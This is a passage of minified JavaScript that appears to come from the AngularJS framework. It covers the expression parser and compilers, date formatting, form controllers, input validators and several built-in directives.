this.peek().identifier?a=this.identifier():this.peek().constant?a=this.constant():this.throwError("not a primary expression",this.peek());for(var b;b=this.expect("(","[",".");)"("===b.text?(a={type:s.CallExpression,callee:a,arguments:this.parseArguments()},this.consume(")")):"["===b.text?(a={type:s.MemberExpression,object:a,property:this.expression(),computed:!0},this.consume("]")):"."===b.text?a={type:s.MemberExpression,object:a,property:this.identifier(),computed:!1}:this.throwError("IMPOSSIBLE");
return a},filter:function(a){a=[a];for(var b={type:s.CallExpression,callee:this.identifier(),arguments:a,filter:!0};this.expect(":");)a.push(this.expression());return b},parseArguments:function(){var a=[];if(")"!==this.peekToken().text){do a.push(this.filterChain());while(this.expect(","))}return a},identifier:function(){var a=this.consume();a.identifier||this.throwError("is not a valid identifier",a);return{type:s.Identifier,name:a.text}},constant:function(){return{type:s.Literal,value:this.consume().value}},
arrayDeclaration:function(){var a=[];if("]"!==this.peekToken().text){do{if(this.peek("]"))break;a.push(this.expression())}while(this.expect(","))}this.consume("]");return{type:s.ArrayExpression,elements:a}},object:function(){var a=[],b;if("}"!==this.peekToken().text){do{if(this.peek("}"))break;b={type:s.Property,kind:"init"};this.peek().constant?(b.key=this.constant(),b.computed=!1,this.consume(":"),b.value=this.expression()):this.peek().identifier?(b.key=this.identifier(),b.computed=!1,this.peek(":")?
(this.consume(":"),b.value=this.expression()):b.value=b.key):this.peek("[")?(this.consume("["),b.key=this.expression(),this.consume("]"),b.computed=!0,this.consume(":"),b.value=this.expression()):this.throwError("invalid key",this.peek());a.push(b)}while(this.expect(","))}this.consume("}");return{type:s.ObjectExpression,properties:a}},throwError:function(a,b){throw Ua("syntax",b.text,a,b.index+1,this.text,this.text.substring(b.index));},consume:function(a){if(0===this.tokens.length)throw Ua("ueoe",
this.text);var b=this.expect(a);b||this.throwError("is unexpected, expecting ["+a+"]",this.peek());return b},peekToken:function(){if(0===this.tokens.length)throw Ua("ueoe",this.text);return this.tokens[0]},peek:function(a,b,d,c){return this.peekAhead(0,a,b,d,c)},peekAhead:function(a,b,d,c,f){if(this.tokens.length>a){a=this.tokens[a];var e=a.text;if(e===b||e===d||e===c||e===f||!(b||d||c||f))return a}return!1},expect:function(a,b,d,c){return(a=this.peek(a,b,d,c))?(this.tokens.shift(),a):!1},selfReferential:{"this":{type:s.ThisExpression},
$locals:{type:s.LocalsExpression}}};Dd.prototype={compile:function(a){var b=this;a=this.astBuilder.ast(a);this.state={nextId:0,filters:{},fn:{vars:[],body:[],own:{}},assign:{vars:[],body:[],own:{}},inputs:[]};V(a,b.$filter);var d="",c;this.stage="assign";if(c=Bd(a))this.state.computing="assign",d=this.nextId(),this.recurse(c,d),this.return_(d),d="fn.assign="+this.generateFunction("assign","s,v,l");c=zd(a.body);b.stage="inputs";q(c,function(a,c){var d="fn"+c;b.state[d]={vars:[],body:[],own:{}};b.state.computing=
d;var h=b.nextId();b.recurse(a,h);b.return_(h);b.state.inputs.push(d);a.watchId=c});this.state.computing="fn";this.stage="main";this.recurse(a);d='"'+this.USE+" "+this.STRICT+'";\n'+this.filterPrefix()+"var fn="+this.generateFunction("fn","s,l,a,i")+d+this.watchFns()+"return fn;";d=(new Function("$filter","getStringValue","ifDefined","plus",d))(this.$filter,ug,vg,yd);this.state=this.stage=void 0;d.literal=Cd(a);d.constant=a.constant;return d},USE:"use",STRICT:"strict",watchFns:function(){var a=[],
b=this.state.inputs,d=this;q(b,function(b){a.push("var "+b+"="+d.generateFunction(b,"s"))});b.length&&a.push("fn.inputs=["+b.join(",")+"];");return a.join("")},generateFunction:function(a,b){return"function("+b+"){"+this.varsPrefix(a)+this.body(a)+"};"},filterPrefix:function(){var a=[],b=this;q(this.state.filters,function(d,c){a.push(d+"=$filter("+b.escape(c)+")")});return a.length?"var "+a.join(",")+";":""},varsPrefix:function(a){return this.state[a].vars.length?"var "+this.state[a].vars.join(",")+
";":""},body:function(a){return this.state[a].body.join("")},recurse:function(a,b,d,c,f,e){var g,h,k=this,l,m,n;c=c||w;if(!e&&v(a.watchId))b=b||this.nextId(),this.if_("i",this.lazyAssign(b,this.computedMember("i",a.watchId)),this.lazyRecurse(a,b,d,c,f,!0));else switch(a.type){case s.Program:q(a.body,function(b,c){k.recurse(b.expression,void 0,void 0,function(a){h=a});c!==a.body.length-1?k.current().body.push(h,";"):k.return_(h)});break;case s.Literal:m=this.escape(a.value);this.assign(b,m);c(b||m);
break;case s.UnaryExpression:this.recurse(a.argument,void 0,void 0,function(a){h=a});m=a.operator+"("+this.ifDefined(h,0)+")";this.assign(b,m);c(m);break;case s.BinaryExpression:this.recurse(a.left,void 0,void 0,function(a){g=a});this.recurse(a.right,void 0,void 0,function(a){h=a});m="+"===a.operator?this.plus(g,h):"-"===a.operator?this.ifDefined(g,0)+a.operator+this.ifDefined(h,0):"("+g+")"+a.operator+"("+h+")";this.assign(b,m);c(m);break;case s.LogicalExpression:b=b||this.nextId();k.recurse(a.left,
b);k.if_("&&"===a.operator?b:k.not(b),k.lazyRecurse(a.right,b));c(b);break;case s.ConditionalExpression:b=b||this.nextId();k.recurse(a.test,b);k.if_(b,k.lazyRecurse(a.alternate,b),k.lazyRecurse(a.consequent,b));c(b);break;case s.Identifier:b=b||this.nextId();d&&(d.context="inputs"===k.stage?"s":this.assign(this.nextId(),this.getHasOwnProperty("l",a.name)+"?l:s"),d.computed=!1,d.name=a.name);k.if_("inputs"===k.stage||k.not(k.getHasOwnProperty("l",a.name)),function(){k.if_("inputs"===k.stage||"s",function(){f&&
1!==f&&k.if_(k.isNull(k.nonComputedMember("s",a.name)),k.lazyAssign(k.nonComputedMember("s",a.name),"{}"));k.assign(b,k.nonComputedMember("s",a.name))})},b&&k.lazyAssign(b,k.nonComputedMember("l",a.name)));c(b);break;case s.MemberExpression:g=d&&(d.context=this.nextId())||this.nextId();b=b||this.nextId();k.recurse(a.object,g,void 0,function(){k.if_(k.notNull(g),function(){a.computed?(h=k.nextId(),k.recurse(a.property,h),k.getStringValue(h),f&&1!==f&&k.if_(k.not(k.computedMember(g,h)),k.lazyAssign(k.computedMember(g,
h),"{}")),m=k.computedMember(g,h),k.assign(b,m),d&&(d.computed=!0,d.name=h)):(f&&1!==f&&k.if_(k.isNull(k.nonComputedMember(g,a.property.name)),k.lazyAssign(k.nonComputedMember(g,a.property.name),"{}")),m=k.nonComputedMember(g,a.property.name),k.assign(b,m),d&&(d.computed=!1,d.name=a.property.name))},function(){k.assign(b,"undefined")});c(b)},!!f);break;case s.CallExpression:b=b||this.nextId();a.filter?(h=k.filter(a.callee.name),l=[],q(a.arguments,function(a){var b=k.nextId();k.recurse(a,b);l.push(b)}),
m=h+"("+l.join(",")+")",k.assign(b,m),c(b)):(h=k.nextId(),g={},l=[],k.recurse(a.callee,h,g,function(){k.if_(k.notNull(h),function(){q(a.arguments,function(b){k.recurse(b,a.constant?void 0:k.nextId(),void 0,function(a){l.push(a)})});m=g.name?k.member(g.context,g.name,g.computed)+"("+l.join(",")+")":h+"("+l.join(",")+")";k.assign(b,m)},function(){k.assign(b,"undefined")});c(b)}));break;case s.AssignmentExpression:h=this.nextId();g={};this.recurse(a.left,void 0,g,function(){k.if_(k.notNull(g.context),
function(){k.recurse(a.right,h);m=k.member(g.context,g.name,g.computed)+a.operator+h;k.assign(b,m);c(b||m)})},1);break;case s.ArrayExpression:l=[];q(a.elements,function(b){k.recurse(b,a.constant?void 0:k.nextId(),void 0,function(a){l.push(a)})});m="["+l.join(",")+"]";this.assign(b,m);c(b||m);break;case s.ObjectExpression:l=[];n=!1;q(a.properties,function(a){a.computed&&(n=!0)});n?(b=b||this.nextId(),this.assign(b,"{}"),q(a.properties,function(a){a.computed?(g=k.nextId(),k.recurse(a.key,g)):g=a.key.type===
s.Identifier?a.key.name:""+a.key.value;h=k.nextId();k.recurse(a.value,h);k.assign(k.member(b,g,a.computed),h)})):(q(a.properties,function(b){k.recurse(b.value,a.constant?void 0:k.nextId(),void 0,function(a){l.push(k.escape(b.key.type===s.Identifier?b.key.name:""+b.key.value)+":"+a)})}),m="{"+l.join(",")+"}",this.assign(b,m));c(b||m);break;case s.ThisExpression:this.assign(b,"s");c(b||"s");break;case s.LocalsExpression:this.assign(b,"l");c(b||"l");break;case s.NGValueParameter:this.assign(b,"v"),c(b||
"v")}},getHasOwnProperty:function(a,b){var d=a+"."+b,c=this.current().own;c.hasOwnProperty(d)||(c[d]=this.nextId(!1,a+"&&("+this.escape(b)+" in "+a+")"));return c[d]},assign:function(a,b){if(a)return this.current().body.push(a,"=",b,";"),a},filter:function(a){this.state.filters.hasOwnProperty(a)||(this.state.filters[a]=this.nextId(!0));return this.state.filters[a]},ifDefined:function(a,b){return"ifDefined("+a+","+this.escape(b)+")"},plus:function(a,b){return"plus("+a+","+b+")"},return_:function(a){this.current().body.push("return ",
a,";")},if_:function(a,b,d){if(!0===a)b();else{var c=this.current().body;c.push("if(",a,"){");b();c.push("}");d&&(c.push("else{"),d(),c.push("}"))}},not:function(a){return"!("+a+")"},isNull:function(a){return a+"==null"},notNull:function(a){return a+"!=null"},nonComputedMember:function(a,b){var d=/[^$_a-zA-Z0-9]/g;return/^[$_a-zA-Z][$_a-zA-Z0-9]*$/.test(b)?a+"."+b:a+'["'+b.replace(d,this.stringEscapeFn)+'"]'},computedMember:function(a,b){return a+"["+b+"]"},member:function(a,b,d){return d?this.computedMember(a,
b):this.nonComputedMember(a,b)},getStringValue:function(a){this.assign(a,"getStringValue("+a+")")},lazyRecurse:function(a,b,d,c,f,e){var g=this;return function(){g.recurse(a,b,d,c,f,e)}},lazyAssign:function(a,b){var d=this;return function(){d.assign(a,b)}},stringEscapeRegex:/[^ a-zA-Z0-9]/g,stringEscapeFn:function(a){return"\\u"+("0000"+a.charCodeAt(0).toString(16)).slice(-4)},escape:function(a){if(E(a))return"'"+a.replace(this.stringEscapeRegex,this.stringEscapeFn)+"'";if(Y(a))return a.toString();
if(!0===a)return"true";if(!1===a)return"false";if(null===a)return"null";if("undefined"===typeof a)return"undefined";throw Ua("esc");},nextId:function(a,b){var d="v"+this.state.nextId++;a||this.current().vars.push(d+(b?"="+b:""));return d},current:function(){return this.state[this.state.computing]}};Ed.prototype={compile:function(a){var b=this;a=this.astBuilder.ast(a);V(a,b.$filter);var d,c;if(d=Bd(a))c=this.recurse(d);d=zd(a.body);var f;d&&(f=[],q(d,function(a,c){var d=b.recurse(a);a.input=d;f.push(d);
a.watchId=c}));var e=[];q(a.body,function(a){e.push(b.recurse(a.expression))});d=0===a.body.length?w:1===a.body.length?e[0]:function(a,b){var c;q(e,function(d){c=d(a,b)});return c};c&&(d.assign=function(a,b,d){return c(a,d,b)});f&&(d.inputs=f);d.literal=Cd(a);d.constant=a.constant;return d},recurse:function(a,b,d){var c,f,e=this,g;if(a.input)return this.inputs(a.input,a.watchId);switch(a.type){case s.Literal:return this.value(a.value,b);case s.UnaryExpression:return f=this.recurse(a.argument),this["unary"+
a.operator](f,b);case s.BinaryExpression:return c=this.recurse(a.left),f=this.recurse(a.right),this["binary"+a.operator](c,f,b);case s.LogicalExpression:return c=this.recurse(a.left),f=this.recurse(a.right),this["binary"+a.operator](c,f,b);case s.ConditionalExpression:return this["ternary?:"](this.recurse(a.test),this.recurse(a.alternate),this.recurse(a.consequent),b);case s.Identifier:return e.identifier(a.name,b,d);case s.MemberExpression:return c=this.recurse(a.object,!1,!!d),a.computed||(f=a.property.name),
a.computed&&(f=this.recurse(a.property)),a.computed?this.computedMember(c,f,b,d):this.nonComputedMember(c,f,b,d);case s.CallExpression:return g=[],q(a.arguments,function(a){g.push(e.recurse(a))}),a.filter&&(f=this.$filter(a.callee.name)),a.filter||(f=this.recurse(a.callee,!0)),a.filter?function(a,c,d,e){for(var n=[],p=0;p<g.length;++p)n.push(g[p](a,c,d,e));a=f.apply(void 0,n,e);return b?{context:void 0,name:void 0,value:a}:a}:function(a,c,d,e){var n=f(a,c,d,e),p;if(null!=n.value){p=[];for(var r=0;r<
g.length;++r)p.push(g[r](a,c,d,e));p=n.value.apply(n.context,p)}return b?{value:p}:p};case s.AssignmentExpression:return c=this.recurse(a.left,!0,1),f=this.recurse(a.right),function(a,d,e,g){var n=c(a,d,e,g);a=f(a,d,e,g);n.context[n.name]=a;return b?{value:a}:a};case s.ArrayExpression:return g=[],q(a.elements,function(a){g.push(e.recurse(a))}),function(a,c,d,e){for(var f=[],p=0;p<g.length;++p)f.push(g[p](a,c,d,e));return b?{value:f}:f};case s.ObjectExpression:return g=[],q(a.properties,function(a){a.computed?
g.push({key:e.recurse(a.key),computed:!0,value:e.recurse(a.value)}):g.push({key:a.key.type===s.Identifier?a.key.name:""+a.key.value,computed:!1,value:e.recurse(a.value)})}),function(a,c,d,e){for(var f={},p=0;p<g.length;++p)g[p].computed?f[g[p].key(a,c,d,e)]=g[p].value(a,c,d,e):f[g[p].key]=g[p].value(a,c,d,e);return b?{value:f}:f};case s.ThisExpression:return function(a){return b?{value:a}:a};case s.LocalsExpression:return function(a,c){return b?{value:c}:c};case s.NGValueParameter:return function(a,
c,d){return b?{value:d}:d}}},"unary+":function(a,b){return function(d,c,f,e){d=a(d,c,f,e);d=v(d)?+d:0;return b?{value:d}:d}},"unary-":function(a,b){return function(d,c,f,e){d=a(d,c,f,e);d=v(d)?-d:-0;return b?{value:d}:d}},"unary!":function(a,b){return function(d,c,f,e){d=!a(d,c,f,e);return b?{value:d}:d}},"binary+":function(a,b,d){return function(c,f,e,g){var h=a(c,f,e,g);c=b(c,f,e,g);h=yd(h,c);return d?{value:h}:h}},"binary-":function(a,b,d){return function(c,f,e,g){var h=a(c,f,e,g);c=b(c,f,e,g);
h=(v(h)?h:0)-(v(c)?c:0);return d?{value:h}:h}},"binary*":function(a,b,d){return function(c,f,e,g){c=a(c,f,e,g)*b(c,f,e,g);return d?{value:c}:c}},"binary/":function(a,b,d){return function(c,f,e,g){c=a(c,f,e,g)/b(c,f,e,g);return d?{value:c}:c}},"binary%":function(a,b,d){return function(c,f,e,g){c=a(c,f,e,g)%b(c,f,e,g);return d?{value:c}:c}},"binary===":function(a,b,d){return function(c,f,e,g){c=a(c,f,e,g)===b(c,f,e,g);return d?{value:c}:c}},"binary!==":function(a,b,d){return function(c,f,e,g){c=a(c,
f,e,g)!==b(c,f,e,g);return d?{value:c}:c}},"binary==":function(a,b,d){return function(c,f,e,g){c=a(c,f,e,g)==b(c,f,e,g);return d?{value:c}:c}},"binary!=":function(a,b,d){return function(c,f,e,g){c=a(c,f,e,g)!=b(c,f,e,g);return d?{value:c}:c}},"binary<":function(a,b,d){return function(c,f,e,g){c=a(c,f,e,g)<b(c,f,e,g);return d?{value:c}:c}},"binary>":function(a,b,d){return function(c,f,e,g){c=a(c,f,e,g)>b(c,f,e,g);return d?{value:c}:c}},"binary<=":function(a,b,d){return function(c,f,e,g){c=a(c,f,e,
g)<=b(c,f,e,g);return d?{value:c}:c}},"binary>=":function(a,b,d){return function(c,f,e,g){c=a(c,f,e,g)>=b(c,f,e,g);return d?{value:c}:c}},"binary&&":function(a,b,d){return function(c,f,e,g){c=a(c,f,e,g)&&b(c,f,e,g);return d?{value:c}:c}},"binary||":function(a,b,d){return function(c,f,e,g){c=a(c,f,e,g)||b(c,f,e,g);return d?{value:c}:c}},"ternary?:":function(a,b,d,c){return function(f,e,g,h){f=a(f,e,g,h)?b(f,e,g,h):d(f,e,g,h);return c?{value:f}:f}},value:function(a,b){return function(){return b?{context:void 0,
name:void 0,value:a}:a}},identifier:function(a,b,d){return function(c,f,e,g){c=f&&a in f?f:c;d&&1!==d&&c&&null==c[a]&&(c[a]={});f=c?c[a]:void 0;return b?{context:c,name:a,value:f}:f}},computedMember:function(a,b,d,c){return function(f,e,g,h){var k=a(f,e,g,h),l,m;null!=k&&(l=b(f,e,g,h),l+="",c&&1!==c&&k&&!k[l]&&(k[l]={}),m=k[l]);return d?{context:k,name:l,value:m}:m}},nonComputedMember:function(a,b,d,c){return function(f,e,g,h){f=a(f,e,g,h);c&&1!==c&&f&&null==f[b]&&(f[b]={});e=null!=f?f[b]:void 0;
return d?{context:f,name:b,value:e}:e}},inputs:function(a,b){return function(d,c,f,e){return e?e[b]:a(d,c,f)}}};var rc=function(a,b,d){this.lexer=a;this.$filter=b;this.options=d;this.ast=new s(a,d);this.astCompiler=d.csp?new Ed(this.ast,b):new Dd(this.ast,b)};rc.prototype={constructor:rc,parse:function(a){return this.astCompiler.compile(a)}};var ua=M("$sce"),pa={HTML:"html",CSS:"css",URL:"url",RESOURCE_URL:"resourceUrl",JS:"js"},sc=/_([a-z])/g,yg=M("$compile"),ca=z.document.createElement("a"),Id=
Da(z.location.href);Jd.$inject=["$document"];Xc.$inject=["$provide"];var Qd=22,Pd=".",uc="0";Kd.$inject=["$locale"];Md.$inject=["$locale"];var Jg={yyyy:aa("FullYear",4,0,!1,!0),yy:aa("FullYear",2,0,!0,!0),y:aa("FullYear",1,0,!1,!0),MMMM:nb("Month"),MMM:nb("Month",!0),MM:aa("Month",2,1),M:aa("Month",1,1),LLLL:nb("Month",!1,!0),dd:aa("Date",2),d:aa("Date",1),HH:aa("Hours",2),H:aa("Hours",1),hh:aa("Hours",2,-12),h:aa("Hours",1,-12),mm:aa("Minutes",2),m:aa("Minutes",1),ss:aa("Seconds",2),s:aa("Seconds",
1),sss:aa("Milliseconds",3),EEEE:nb("Day"),EEE:nb("Day",!0),a:function(a,b){return 12>a.getHours()?b.AMPMS[0]:b.AMPMS[1]},Z:function(a,b,d){a=-1*d;return a=(0<=a?"+":"")+(Kb(Math[0<a?"floor":"ceil"](a/60),2)+Kb(Math.abs(a%60),2))},ww:Sd(2),w:Sd(1),G:vc,GG:vc,GGG:vc,GGGG:function(a,b){return 0>=a.getFullYear()?b.ERANAMES[0]:b.ERANAMES[1]}},Ig=/((?:[^yMLdHhmsaZEwG']+)|(?:'(?:[^']|'')*')|(?:E+|y+|M+|L+|d+|H+|h+|m+|s+|a|Z|G+|w+))(.*)/,Hg=/^-?\d+$/;Ld.$inject=["$locale"];var Cg=ma(P),Dg=ma(vb);Nd.$inject=
["$parse"];var Ae=ma({restrict:"E",compile:function(a,b){if(!b.href&&!b.xlinkHref)return function(a,b){if("a"===b[0].nodeName.toLowerCase()){var f="[object SVGAnimatedString]"===na.call(b.prop("href"))?"xlink:href":"href";b.on("click",function(a){b.attr(f)||a.preventDefault()})}}}}),wb={};q(Gb,function(a,b){function d(a,d,f){a.$watch(f[c],function(a){f.$set(b,!!a)})}if("multiple"!==a){var c=Ca("ng-"+b),f=d;"checked"===a&&(f=function(a,b,f){f.ngModel!==f[c]&&d(a,b,f)});wb[c]=function(){return{restrict:"A",
priority:100,link:f}}}});q(ld,function(a,b){wb[b]=function(){return{priority:100,link:function(a,c,f){if("ngPattern"===b&&"/"===f.ngPattern.charAt(0)&&(c=f.ngPattern.match(Ng))){f.$set("ngPattern",new RegExp(c[1],c[2]));return}a.$watch(f[b],function(a){f.$set(b,a)})}}}});q(["src","srcset","href"],function(a){var b=Ca("ng-"+a);wb[b]=function(){return{priority:99,link:function(d,c,f){var e=a,g=a;"href"===a&&"[object SVGAnimatedString]"===na.call(c.prop("href"))&&(g="xlinkHref",f.$attr[g]="xlink:href",
e=null);f.$observe(b,function(b){b?(f.$set(g,b),La&&e&&c.prop(e,f[g])):"href"===a&&f.$set(g,null)})}}}});var Mb={$addControl:w,$$renameControl:function(a,b){a.$name=b},$removeControl:w,$setValidity:w,$setDirty:w,$setPristine:w,$setSubmitted:w};Lb.$inject=["$element","$attrs","$scope","$animate","$interpolate"];Lb.prototype={$rollbackViewValue:function(){q(this.$$controls,function(a){a.$rollbackViewValue()})},$commitViewValue:function(){q(this.$$controls,function(a){a.$commitViewValue()})},$addControl:function(a){Pa(a.$name,
"input");this.$$controls.push(a);a.$name&&(this[a.$name]=a);a.$$parentForm=this},$$renameControl:function(a,b){var d=a.$name;this[d]===a&&delete this[d];this[b]=a;a.$name=b},$removeControl:function(a){a.$name&&this[a.$name]===a&&delete this[a.$name];q(this.$pending,function(b,d){this.$setValidity(d,null,a)},this);q(this.$error,function(b,d){this.$setValidity(d,null,a)},this);q(this.$$success,function(b,d){this.$setValidity(d,null,a)},this);$a(this.$$controls,a);a.$$parentForm=Mb},$setDirty:function(){this.$$animate.removeClass(this.$$element,
Va);this.$$animate.addClass(this.$$element,Rb);this.$dirty=!0;this.$pristine=!1;this.$$parentForm.$setDirty()},$setPristine:function(){this.$$animate.setClass(this.$$element,Va,Rb+" ng-submitted");this.$dirty=!1;this.$pristine=!0;this.$submitted=!1;q(this.$$controls,function(a){a.$setPristine()})},$setUntouched:function(){q(this.$$controls,function(a){a.$setUntouched()})},$setSubmitted:function(){this.$$animate.addClass(this.$$element,"ng-submitted");this.$submitted=!0;this.$$parentForm.$setSubmitted()}};
Vd({clazz:Lb,set:function(a,b,d){var c=a[b];c?-1===c.indexOf(d)&&c.push(d):a[b]=[d]},unset:function(a,b,d){var c=a[b];c&&($a(c,d),0===c.length&&delete a[b])}});var ce=function(a){return["$timeout","$parse",function(b,d){function c(a){return""===a?d('this[""]').assign:d(a).assign||w}return{name:"form",restrict:a?"EAC":"E",require:["form","^^?form"],controller:Lb,compile:function(d,e){d.addClass(Va).addClass(ob);var g=e.name?"name":a&&e.ngForm?"ngForm":!1;return{pre:function(a,d,e,f){var n=f[0];if(!("action"in
e)){var p=function(b){a.$apply(function(){n.$commitViewValue();n.$setSubmitted()});b.preventDefault()};d[0].addEventListener("submit",p);d.on("$destroy",function(){b(function(){d[0].removeEventListener("submit",p)},0,!1)})}(f[1]||n.$$parentForm).$addControl(n);var r=g?c(n.$name):w;g&&(r(a,n),e.$observe(g,function(b){n.$name!==b&&(r(a,void 0),n.$$parentForm.$$renameControl(n,b),r=c(n.$name),r(a,n))}));d.on("$destroy",function(){n.$$parentForm.$removeControl(n);r(a,void 0);R(n,Mb)})}}}}}]},Be=ce(),
Ne=ce(!0),Kg=/^\d{4,}-[01]\d-[0-3]\dT[0-2]\d:[0-5]\d:[0-5]\d\.\d+(?:[+-][0-2]\d:[0-5]\d|Z)$/,Vg=/^[a-z][a-z\d.+-]*:\/*(?:[^:@]+(?::[^@]+)?@)?(?:[^\s:/?#]+|\[[a-f\d:]+])(?::\d+)?(?:\/[^?#]*)?(?:\?[^#]*)?(?:#.*)?$/i,Wg=/^(?=.{1,254}$)(?=.{1,64}@)[-!#$%&'*+/0-9=?A-Z^_`a-z{|}~]+(\.[-!#$%&'*+/0-9=?A-Z^_`a-z{|}~]+)*@[A-Za-z0-9]([A-Za-z0-9-]{0,61}[A-Za-z0-9])?(\.[A-Za-z0-9]([A-Za-z0-9-]{0,61}[A-Za-z0-9])?)*$/,Lg=/^\s*(-|\+)?(\d+|(\d*(\.\d*)))([eE][+-]?\d+)?\s*$/,de=/^(\d{4,})-(\d{2})-(\d{2})$/,ee=/^(\d{4,})-(\d\d)-(\d\d)T(\d\d):(\d\d)(?::(\d\d)(\.\d{1,3})?)?$/,
Cc=/^(\d{4,})-W(\d\d)$/,fe=/^(\d{4,})-(\d\d)$/,ge=/^(\d\d):(\d\d)(?::(\d\d)(\.\d{1,3})?)?$/,Xd=W();q(["date","datetime-local","month","time","week"],function(a){Xd[a]=!0});var he={text:function(a,b,d,c,f,e){Sa(a,b,d,c,f,e);xc(c)},date:pb("date",de,Nb(de,["yyyy","MM","dd"]),"yyyy-MM-dd"),"datetime-local":pb("datetimelocal",ee,Nb(ee,"yyyy MM dd HH mm ss sss".split(" ")),"yyyy-MM-ddTHH:mm:ss.sss"),time:pb("time",ge,Nb(ge,["HH","mm","ss","sss"]),"HH:mm:ss.sss"),week:pb("week",Cc,function(a,b){if(fa(a))return a;
if(E(a)){Cc.lastIndex=0;var d=Cc.exec(a);if(d){var c=+d[1],f=+d[2],e=d=0,g=0,h=0,k=Rd(c),f=7*(f-1);b&&(d=b.getHours(),e=b.getMinutes(),g=b.getSeconds(),h=b.getMilliseconds());return new Date(c,0,k.getDate()+f,d,e,g,h)}}return NaN},"yyyy-Www"),month:pb("month",fe,Nb(fe,["yyyy","MM"]),"yyyy-MM"),number:function(a,b,d,c,f,e){yc(a,b,d,c);Yd(c);Sa(a,b,d,c,f,e);var g,h;if(v(d.min)||d.ngMin)c.$validators.min=function(a){return c.$isEmpty(a)||x(g)||a>=g},d.$observe("min",function(a){g=Ta(a);c.$validate()});
if(v(d.max)||d.ngMax)c.$validators.max=function(a){return c.$isEmpty(a)||x(h)||a<=h},d.$observe("max",function(a){h=Ta(a);c.$validate()});if(v(d.step)||d.ngStep){var k;c.$validators.step=function(a,b){return c.$isEmpty(b)||x(k)||Zd(b,g||0,k)};d.$observe("step",function(a){k=Ta(a);c.$validate()})}},url:function(a,b,d,c,f,e){Sa(a,b,d,c,f,e);xc(c);c.$$parserName="url";c.$validators.url=function(a,b){var d=a||b;return c.$isEmpty(d)||Vg.test(d)}},email:function(a,b,d,c,f,e){Sa(a,b,d,c,f,e);xc(c);c.$$parserName=
"email";c.$validators.email=function(a,b){var d=a||b;return c.$isEmpty(d)||Wg.test(d)}},radio:function(a,b,d,c){var f=!d.ngTrim||"false"!==S(d.ngTrim);x(d.name)&&b.attr("name",++rb);b.on("click",function(a){var g;b[0].checked&&(g=d.value,f&&(g=S(g)),c.$setViewValue(g,a&&a.type))});c.$render=function(){var a=d.value;f&&(a=S(a));b[0].checked=a===c.$viewValue};d.$observe("value",c.$render)},range:function(a,b,d,c,f,e){function g(a,c){b.attr(a,d[a]);d.$observe(a,c)}function h(a){n=Ta(a);ga(c.$modelValue)||
(m?(a=b.val(),n>a&&(a=n,b.val(a)),c.$setViewValue(a)):c.$validate())}function k(a){p=Ta(a);ga(c.$modelValue)||(m?(a=b.val(),p<a&&(b.val(p),a=p<n?n:p),c.$setViewValue(a)):c.$validate())}function l(a){r=Ta(a);ga(c.$modelValue)||(m&&c.$viewValue!==b.val()?c.$setViewValue(b.val()):c.$validate())}yc(a,b,d,c);Yd(c);Sa(a,b,d,c,f,e);var m=c.$$hasNativeValidators&&"range"===b[0].type,n=m?0:void 0,p=m?100:void 0,r=m?1:void 0,q=b[0].validity;a=v(d.min);f=v(d.max);e=v(d.step);var s=c.$render;c.$render=m&&v(q.rangeUnderflow)&&
v(q.rangeOverflow)?function(){s();c.$setViewValue(b.val())}:s;a&&(c.$validators.min=m?function(){return!0}:function(a,b){return c.$isEmpty(b)||x(n)||b>=n},g("min",h));f&&(c.$validators.max=m?function(){return!0}:function(a,b){return c.$isEmpty(b)||x(p)||b<=p},g("max",k));e&&(c.$validators.step=m?function(){return!q.stepMismatch}:function(a,b){return c.$isEmpty(b)||x(r)||Zd(b,n||0,r)},g("step",l))},checkbox:function(a,b,d,c,f,e,g,h){var k=$d(h,a,"ngTrueValue",d.ngTrueValue,!0),l=$d(h,a,"ngFalseValue",
d.ngFalseValue,!1);b.on("click",function(a){c.$setViewValue(b[0].checked,a&&a.type)});c.$render=function(){b[0].checked=c.$viewValue};c.$isEmpty=function(a){return!1===a};c.$formatters.push(function(a){return qa(a,k)});c.$parsers.push(function(a){return a?k:l})},hidden:w,button:w,submit:w,reset:w,file:w},Rc=["$browser","$sniffer","$filter","$parse",function(a,b,d,c){return{restrict:"E",require:["?ngModel"],link:{pre:function(f,e,g,h){h[0]&&(he[P(g.type)]||he.text)(f,e,g,h[0],b,a,d,c)}}}}],Xg=/^(true|false|\d+)$/,
ef=function(){return{restrict:"A",priority:100,compile:function(a,b){return Xg.test(b.ngValue)?function(a,b,f){a=a.$eval(f.ngValue);b.prop("value",a);f.$set("value",a)}:function(a,b,f){a.$watch(f.ngValue,function(a){b.prop("value",a);f.$set("value",a)})}}}},Fe=["$compile",function(a){return{restrict:"AC",compile:function(b){a.$$addBindingClass(b);return function(b,c,f){a.$$addBindingInfo(c,f.ngBind);c=c[0];b.$watch(f.ngBind,function(a){c.textContent=Yb(a)})}}}}],He=["$interpolate","$compile",function(a,
b){return{compile:function(d){b.$$addBindingClass(d);return function(c,d,e){c=a(d.attr(e.$attr.ngBindTemplate));b.$$addBindingInfo(d,c.expressions);d=d[0];e.$observe("ngBindTemplate",function(a){d.textContent=x(a)?"":a})}}}}],Ge=["$sce","$parse","$compile",function(a,b,d){return{restrict:"A",compile:function(c,f){var e=b(f.ngBindHtml),g=b(f.ngBindHtml,function(b){return a.valueOf(b)});d.$$addBindingClass(c);return function(b,c,f){d.$$addBindingInfo(c,f.ngBindHtml);b.$watch(g,function(){var d=e(b);
c.html(a.getTrustedHtml(d)||"")})}}}}],df=ma({restrict:"A",require:"ngModel",link:function(a,b,d,c){c.$viewChangeListeners.push(function(){a.$eval(d.ngChange)})}}),Ie=Ac("",!0),Ke=Ac("Odd",0),Je=Ac("Even",1),Le=Ra({compile:function(a,b){b.$set("ngCloak",void 0);a.removeClass("ng-cloak")}}),Me=[function(){return{restrict:"A",scope:!0,controller:"@",priority:500}}],Wc={},Yg={blur:!0,focus:!0};q("click dblclick mousedown mouseup mouseover mouseout mousemove mouseenter mouseleave keydown keyup keypress submit focus blur copy cut paste".split(" "),
function(a){var b=Ca("ng-"+a);Wc[b]=["$parse","$rootScope",function(d,c){return{restrict:"A",compile:function(f,e){var g=d(e[b],null,!0);return function(b,d){d.on(a,function(d){var e=function(){g(b,{$event:d})};Yg[a]&&c.$$phase?b.$evalAsync(e):b.$apply(e)})}}}}]});var Pe=["$animate","$compile",function(a,b){return{multiElement:!0,transclude:"element",priority:600,terminal:!0,restrict:"A",$$tlb:!0,link:function(d,c,f,e,g){var h,k,l;d.$watch(f.ngIf,function(d){d?k||g(function(d,e){k=e;d[d.length++]=
